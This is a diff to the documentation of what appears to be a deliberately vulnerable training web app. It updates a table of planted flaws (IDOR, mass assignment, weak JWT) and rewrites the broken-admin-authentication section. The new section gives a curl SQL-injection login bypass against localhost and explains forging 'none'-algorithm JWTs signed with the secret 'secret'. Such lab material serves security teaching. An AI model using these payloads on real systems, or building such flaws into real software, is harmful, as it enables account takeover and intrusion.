@@ -21,7 +21,7 @@ Do not deploy on production systems or public networks.
 | 10 | IDOR — Rounds | A01 | `GET/PUT/DELETE /api/rounds/:id` | High |
 | 11 | IDOR — User Profiles | A01 | `GET /api/users/:id` | High |
 | 12 | Mass Assignment / Privilege Escalation | A01 | `PUT /api/users/:id` | Critical |
-| 13 | Broken Admin Authentication | A07 | `GET /api/admin/*` | Critical |
+| 13 | Broken Admin Authentication (JWT forgery) | A07 | `POST /api/admin/login`, `GET /api/admin/*` | Critical |
 | 14 | Weak JWT (none algorithm) | A07 | All authenticated endpoints | Critical |
 | 15 | Weak JWT (secret key) | A02 | All authenticated endpoints | High |
 | 16 | JWT in localStorage | A05 | Frontend (AuthContext) | Medium |
@@ -204,10 +204,13 @@ curl -X PUT http://localhost:3001/api/users/1 \
 
 ### 13. Broken Admin Authentication
 
-**Exploit — Access admin panel without login:**
+Admin login posts credentials to `POST /api/admin/login`. The endpoint is vulnerable to SQLi (same as regular login) and issues a JWT signed with the weak secret `"secret"`. All admin routes validate that JWT but accept the `none` algorithm, so the token can be forged entirely without the secret.
+
+**Exploit — SQLi bypass on admin login:**
 ```bash
-curl http://localhost:3001/api/admin/users \
-  -H "x-admin-key: admin"
+curl -X POST http://localhost:3001/api/admin/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "admin@golf.com'\''--", "password": "anything"}'
 ```
 
 **Exploit — Forge JWT with role=admin (since secret is "secret"):**
